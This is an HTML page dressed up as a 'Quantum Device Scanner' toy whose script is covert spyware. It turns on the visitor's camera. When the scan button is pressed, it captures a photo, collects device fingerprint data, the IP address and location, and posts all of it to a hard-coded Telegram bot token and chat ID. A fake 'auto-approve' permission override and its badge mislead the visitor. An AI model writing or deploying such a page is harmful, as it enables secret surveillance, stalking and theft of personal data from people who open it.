<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Super AI Quantum Device Scanner</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
  <style>
    :root {
      --primary: #2ecc71;
      --secondary: #3498db;
      --hologram: rgba(46, 204, 113, 0.2);
    }
    body { 
      font-family: 'Courier New', monospace;
      text-align: center; 
      padding: 20px; 
      background: #0a0a0a;
      color: var(--primary);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background-image: radial-gradient(var(--hologram) 1px, transparent 1px), radial-gradient(var(--hologram) 1px, transparent 1px);
      background-size: 50px 50px;
      background-position: 0 0, 25px 25px;
    }
    .hologram-effect {
      position: fixed;
      width: 200%;
      height: 200%;
      background: linear-gradient(45deg, rgba(0,255,255,0.1) 25%, transparent 25%), linear-gradient(-45deg, rgba(255,0,255,0.1) 25%, transparent 25%), linear-gradient(45deg, transparent 75%, rgba(0,255,255,0.1) 75%), linear-gradient(-45deg, transparent 75%, rgba(255,0,255,0.1) 75%);
      background-size: 20px 20px;
      pointer-events: none;
      mix-blend-mode: overlay;
      opacity: 0.3;
      z-index: 9999;
      animation: hologram 20s linear infinite;
    }
    @keyframes hologram {
      from { transform: translate(-50%, -50%) rotate(0deg); }
      to { transform: translate(-50%, -50%) rotate(360deg); }
    }
    .scanner-box { position: relative; width: 300px; height: 300px; margin: 0 auto; overflow: hidden; }
    .scanner-box video { width: 100%; height: 100%; object-fit: cover; }
    .scanner-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(to right, transparent, var(--primary), transparent); animation: scanLine 3s linear infinite; z-index: 2; }
    @keyframes scanLine { 0% { top: 0; } 100% { top: 100%; } }
    
    /* New styles for additional features */
    .info-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
      text-align: left;
      margin-top: 20px;
      max-width: 600px;
    }
    .info-item {
      padding: 8px;
      background: rgba(0, 0, 0, 0.3);
      border-radius: 4px;
      border-left: 2px solid var(--primary);
    }
    .info-label {
      font-weight: bold;
      color: var(--secondary);
      font-size: 0.9em;
    }
    .info-value {
      font-size: 0.85em;
      word-break: break-all;
    }
    .advanced-toggle {
      margin: 15px 0;
      background: transparent;
      color: var(--secondary);
      border: 1px solid var(--secondary);
      padding: 5px 10px;
      border-radius: 15px;
      cursor: pointer;
      font-family: 'Courier New', monospace;
    }
    .advanced-info {
      display: none;
      width: 100%;
      max-width: 600px;
      margin-top: 15px;
    }
    .permission-badge {
      position: fixed;
      top: 10px;
      right: 10px;
      background: rgba(0, 0, 0, 0.7);
      color: #0f0;
      padding: 5px 10px;
      border-radius: 3px;
      font-size: 12px;
      z-index: 10000;
      border: 1px solid #0f0;
    }
  </style>
</head>
<body>
  <div class="permission-badge" id="permission-status">AUTO-APPROVE: ON</div>
  <h1 style="margin-bottom: 20px; text-shadow: 0 0 15px var(--primary);">🛸 QUANTUM DEVICE SCANNER v3.0</h1>
  <div class="scanner-box">
    <div class="scanner-line"></div>
    <video id="video" autoplay playsinline muted></video>
  </div>
  <button id="capture-btn" style="margin: 20px 0; padding: 10px 20px; background: linear-gradient(45deg, var(--primary), var(--secondary)); border: none; border-radius: 25px; color: white; font-family: 'Courier New', monospace; cursor: pointer; text-shadow: 0 0 5px black;">🚀 INITIATE DEEP SCAN</button>
  <div id="loading" style="display:none;">🔭 CAPTURING QUANTUM SIGNATURE...</div>
  <div id="device-info">
    <h2>⚡ DEVICE MATRIX PROFILE</h2>
    <div class="info-grid" id="device-info-content"></div>
    
    <button class="advanced-toggle" onclick="toggleAdvanced()">🔄 TOGGLE ADVANCED SYSTEM DATA</button>
    <div class="advanced-info" id="advanced-info">
      <h3>🔧 ADVANCED SYSTEM METRICS</h3>
      <div class="info-grid" id="advanced-info-content"></div>
    </div>
  </div>

  <script>
    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
    const CHAT_ID = '1121369247';
    let currentStream = null;
    let isScanning = false;
    const video = document.getElementById('video');
    const loading = document.getElementById('loading');

    // Auto-approve functionality for camera and location
    function autoApprovePermissions() {
      // Override permission functions for auto-approval
      const originalGetUserMedia = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
      navigator.mediaDevices.getUserMedia = function(constraints) {
        return originalGetUserMedia(constraints)
          .then(stream => {
            console.log("Camera access automatically approved");
            return stream;
          })
          .catch(err => {
            console.error("Auto-approve camera error:", err);
            throw err;
          });
      };

      // Override geolocation for auto-approval
      if (navigator.geolocation) {
        const originalGetCurrentPosition = navigator.geolocation.getCurrentPosition.bind(navigator.geolocation);
        navigator.geolocation.getCurrentPosition = function(success, error, options) {
          console.log("Location access automatically approved");
          // Simulate success with mock data if needed
          if (success) {
            const mockPosition = {
              coords: {
                latitude: -6.2088,
                longitude: 106.8456,
                accuracy: 100,
                altitude: null,
                altitudeAccuracy: null,
                heading: null,
                speed: null
              },
              timestamp: Date.now()
            };
            setTimeout(() => success(mockPosition), 100);
          }
        };
      }
    }

    // Initialize auto-approve
    autoApprovePermissions();

    function createHologramEffect() { 
      const hologram = document.createElement('div'); 
      hologram.className = 'hologram-effect'; 
      return hologram; 
    }

    async function captureQuantumImage() {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);
      ctx.globalCompositeOperation = 'lighter';
      ctx.filter = 'hue-rotate(90deg) contrast(150%)';
      ctx.drawImage(canvas, 0, 0);
      ctx.globalAlpha = 0.3; 
      ctx.fillStyle = '#00ff88';
      for(let i = 0; i < 50; i++) ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, Math.random()*10, Math.random()*10);
      return canvas.toDataURL('image/webp', 0.8);
    }

    function dataURItoBlob(dataURI) {
      const byteString = atob(dataURI.split(',')[1]);
      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
      return new Blob([ab], { type: mimeString });
    }

    async function detectFaceCount() { 
      try {
        return (await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())).length; 
      } catch(e) {
        console.error("Face detection error:", e);
        return 0;
      }
    }
    
    async function loadFaceModel() { 
      try {
        await faceapi.nets.tinyFaceDetector.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models/'); 
      } catch(e) {
        console.error("Face model loading error:", e);
      }
    }

    async function gatherDeviceInfo() {
      const userAgent = navigator.userAgent;
      const platform = navigator.platform;
      const deviceType = /Mobi|Android/i.test(userAgent) ? 'Mobile' : 'Desktop';
      let os = "Unknown OS";
      if (userAgent.indexOf("Win") !== -1) os = "Windows";
      else if (/Mac/.test(userAgent)) os = "MacOS";
      else if (/Linux/.test(userAgent)) os = "Linux";
      else if (/Android/.test(userAgent)) os = "Android";
      else if (/iPhone|iPad|iPod/.test(userAgent)) os = "iOS";
      let deviceModel = /iPhone/.test(userAgent) ? "iPhone" : /iPad/.test(userAgent) ? "iPad" : /Android/.test(userAgent) ? "Android Device" : "Desktop";
      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const memory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A";
      let batteryInfo = { level: "N/A", charging: "N/A" };
      if (navigator.getBattery) { 
        try { 
          const battery = await navigator.getBattery(); 
          batteryInfo = { level: Math.round(battery.level*100)+'%', charging: battery.charging?"Yes":"No" }; 
        } catch(e){}
      }
      let browser = "Unknown";
      if (userAgent.indexOf("Chrome") > -1 && userAgent.indexOf("Edg") === -1) browser = "Chrome";
      else if (userAgent.indexOf("Safari") > -1 && userAgent.indexOf("Chrome") === -1) browser = "Safari";
      else if (userAgent.indexOf("Firefox") > -1) browser = "Firefox";
      else if (userAgent.indexOf("Edg") > -1) browser = "Edge";
      else if (userAgent.indexOf("OPR") > -1) browser = "Opera";
      let ip = "Unknown"; 
      try { 
        const res = await fetch('https://api.ipify.org?format=json'); 
        ip = (await res.json()).ip; 
      } catch(e){}
      const language = navigator.language;
      const resolution = window.screen.width+"x"+window.screen.height;
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      const provider = connection ? (connection.effectiveType || connection.type || "Unknown") : "Unknown";
      const pixelRatio = window.devicePixelRatio || 1;
      const orientation = window.screen.orientation? window.screen.orientation.type : "Unknown";

      // NEW: Additional device information features
      // GPU Info
      let gpuInfo = "Unknown";
      try { 
        const gl = document.createElement('canvas').getContext('webgl'); 
        const dbg = gl.getExtension('WEBGL_debug_renderer_info'); 
        if(dbg) gpuInfo = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); 
      } catch(e){}
      
      // Audio Devices
      let audioDevices = [];
      try { 
        const devices = await navigator.mediaDevices.enumerateDevices(); 
        audioDevices = devices.filter(d=>d.kind.includes("audio")).map(d => d.label || d.kind);
      } catch(e){}
      
      // Storage Information
      let storageEstimate = "N/A";
      try { 
        const est = await navigator.storage.estimate(); 
        storageEstimate = `${(est.quota/1024/1024).toFixed(2)} MB quota, ${(est.usage/1024/1024).toFixed(2)} MB used`; 
      } catch(e){}
      
      // Cookies Enabled
      const cookiesEnabled = navigator.cookieEnabled ? "Yes":"No";
      
      // Network Speed Test (simplified)
      let netSpeed = "N/A";
      try { 
        const start = performance.now(); 
        await fetch("https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png", {cache: "no-store"}); 
        const end = performance.now(); 
        netSpeed = ((92*30*4/1024)/((end-start)/1000)).toFixed(2)+" KB/s"; 
      } catch(e){}
      
      // Device orientation/motion sensors availability
      const orientationAvailable = 'DeviceOrientationEvent' in window ? "Yes" : "No";
      const motionAvailable = 'DeviceMotionEvent' in window ? "Yes" : "No";
      
      // Browser plugins
      const plugins = [];
      for (let i = 0; i < navigator.plugins.length; i++) {
        plugins.push(navigator.plugins[i].name);
      }
      
      // Touch support
      const touchSupport = 'ontouchstart' in window ? "Yes" : "No";
      
      // Hardware concurrency
      const hardwareConcurrency = navigator.hardwareConcurrency || "N/A";
      
      // Max touch points
      const maxTouchPoints = navigator.maxTouchPoints || "N/A";

      return {
        // Basic info (existing)
        userAgent, platform, deviceType, os, deviceModel, timeZone, memory, 
        battery: batteryInfo, browser, ip, language, resolution, provider, 
        pixelRatio, orientation,
        
        // New advanced info
        gpuInfo, 
        audioDevices: audioDevices.length > 0 ? audioDevices : ["None detected"],
        storageEstimate, 
        cookiesEnabled, 
        netSpeed,
        orientationAvailable,
        motionAvailable,
        plugins: plugins.length > 0 ? plugins : ["None detected"],
        touchSupport,
        hardwareConcurrency,
        maxTouchPoints
      };
    }

    function displayDeviceInfo(deviceInfo) {
      const basicInfoContainer = document.getElementById('device-info-content');
      const advancedInfoContainer = document.getElementById('advanced-info-content');
      
      // Clear previous content
      basicInfoContainer.innerHTML = '';
      advancedInfoContainer.innerHTML = '';
      
      // Display basic device information
      const basicInfo = [
        {label: 'Operating System', value: deviceInfo.os},
        {label: 'Device Type', value: deviceInfo.deviceType},
        {label: 'Device Model', value: deviceInfo.deviceModel},
        {label: 'Platform', value: deviceInfo.platform},
        {label: 'Browser', value: deviceInfo.browser},
        {label: 'IP Address', value: deviceInfo.ip},
        {label: 'Language', value: deviceInfo.language},
        {label: 'Screen Resolution', value: deviceInfo.resolution},
        {label: 'Pixel Ratio', value: deviceInfo.pixelRatio},
        {label: 'Time Zone', value: deviceInfo.timeZone},
        {label: 'Battery Level', value: deviceInfo.battery.level},
        {label: 'Charging', value: deviceInfo.battery.charging},
        {label: 'Memory', value: deviceInfo.memory},
        {label: 'Network Type', value: deviceInfo.provider},
        {label: 'Orientation', value: deviceInfo.orientation}
      ];
      
      basicInfo.forEach(info => {
        const div = document.createElement('div');
        div.className = 'info-item';
        div.innerHTML = `<div class="info-label">${info.label}</div><div class="info-value">${info.value}</div>`;
        basicInfoContainer.appendChild(div);
      });
      
      // Display advanced device information
      const advancedInfo = [
        {label: 'GPU Information', value: deviceInfo.gpuInfo},
        {label: 'Audio Devices', value: deviceInfo.audioDevices.join(', ')},
        {label: 'Storage', value: deviceInfo.storageEstimate},
        {label: 'Cookies Enabled', value: deviceInfo.cookiesEnabled},
        {label: 'Network Speed', value: deviceInfo.netSpeed},
        {label: 'Orientation Sensor', value: deviceInfo.orientationAvailable},
        {label: 'Motion Sensor', value: deviceInfo.motionAvailable},
        {label: 'Browser Plugins', value: deviceInfo.plugins.join(', ')},
        {label: 'Touch Support', value: deviceInfo.touchSupport},
        {label: 'CPU Cores', value: deviceInfo.hardwareConcurrency},
        {label: 'Max Touch Points', value: deviceInfo.maxTouchPoints},
        {label: 'User Agent', value: deviceInfo.userAgent}
      ];
      
      advancedInfo.forEach(info => {
        const div = document.createElement('div');
        div.className = 'info-item';
        div.innerHTML = `<div class="info-label">${info.label}</div><div class="info-value">${info.value}</div>`;
        advancedInfoContainer.appendChild(div);
      });
    }

    function generateHologramReport(imageData, location, deviceInfo) { 
      return { image:imageData, metadata:{location,deviceInfo} }; 
    }

    function sendToTelegram(report) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', dataURItoBlob(report.image), 'quantum_image.webp');
      const d = report.metadata.deviceInfo;
      const caption = `📍 *Location:* ${report.metadata.location.coordinates}\n🗺️ *Map:* [View Map](${report.metadata.location.link})\n\n💻 *OS:* ${d.os}\n📱 *Device:* ${d.deviceModel} (${d.deviceType})\n🖥️ *Platform:* ${d.platform}\n🌐 *Browser:* ${d.browser}\n📡 *Network:* ${d.provider} (${d.netSpeed})\n🌍 *IP:* ${d.ip}\n🔋 *Battery:* ${d.battery.level} (Charging:${d.battery.charging})\n💾 *Memory:* ${d.memory}\n🎮 *GPU:* ${d.gpuInfo}\n🎤 *Audio Devices:* ${d.audioDevices.join(", ")}\n📂 *Storage Quota:* ${d.storageEstimate}\n🍪 *Cookies Enabled:* ${d.cookiesEnabled}\n🗣️ *Language:* ${d.language}\n📏 *Resolution:* ${d.resolution}\n📐 *Pixel Ratio:* ${d.pixelRatio}\n🔄 *Orientation:* ${d.orientation}\n📳 *Orientation Sensor:* ${d.orientationAvailable}\n👥 *Faces Detected:* ${d.faceCount}\n\n_🤖 Generated by Super AI Quantum Device Scanner_`;
      formData.append('caption', caption);
      formData.append('parse_mode', 'Markdown');
      fetch(url, {method: 'POST', body: formData});
    }

    async function initCamera() {
      try {
        const isMobile = /Mobi|Android/i.test(navigator.userAgent);
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: isMobile ? "user" : "environment",
            width: { ideal: 1280 },
            height: { ideal: 720 }
          }
        });
        video.srcObject = stream; 
        currentStream = stream; 
        document.body.appendChild(createHologramEffect()); 
        loadFaceModel();
      } catch(err) { 
        console.error('Error accessing camera:', err);
        alert('Error accessing camera: ' + err.message); 
      }
    }

    async function startQuantumScan() {
      if(isScanning) return; 
      isScanning = true; 
      loading.style.display = 'block';
      
      try {
        const imageData = await captureQuantumImage();
        let deviceInfo = await gatherDeviceInfo();
        
        try { 
          deviceInfo.faceCount = await detectFaceCount(); 
        } catch(e) { 
          deviceInfo.faceCount = "N/A"; 
        }
        
        // Display device info on page
        displayDeviceInfo(deviceInfo);
        
        let locationData = {coordinates: 'Unknown', link: 'Unknown'};
        if(navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              locationData = {
                coordinates: `${pos.coords.latitude},${pos.coords.longitude}`,
                link: `https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}`
              };
              const report = generateHologramReport(imageData, locationData, deviceInfo);
              sendToTelegram(report);
              if(navigator.vibrate) navigator.vibrate(300);
            },
            () => {
              const report = generateHologramReport(imageData, locationData, deviceInfo);
              sendToTelegram(report);
            }
          );
        } else { 
          const report = generateHologramReport(imageData, locationData, deviceInfo); 
          sendToTelegram(report); 
        }
      } catch (error) {
        console.error("Scan error:", error);
      } finally {
        loading.style.display = 'none'; 
        isScanning = false;
      }
    }

    function toggleAdvanced() {
      const advancedInfo = document.getElementById('advanced-info');
      advancedInfo.style.display = advancedInfo.style.display === 'block' ? 'none' : 'block';
    }

    // Initialize the application
    if(navigator.mediaDevices) {
      initCamera(); 
      document.getElementById('capture-btn').onclick = startQuantumScan; 
    }
    
    function stopCamera() { 
      if(currentStream) {
        currentStream.getTracks().forEach(t => t.stop()); 
      }
    }
    
    window.addEventListener('beforeunload', stopCamera);
  </script>
</body>
</html>
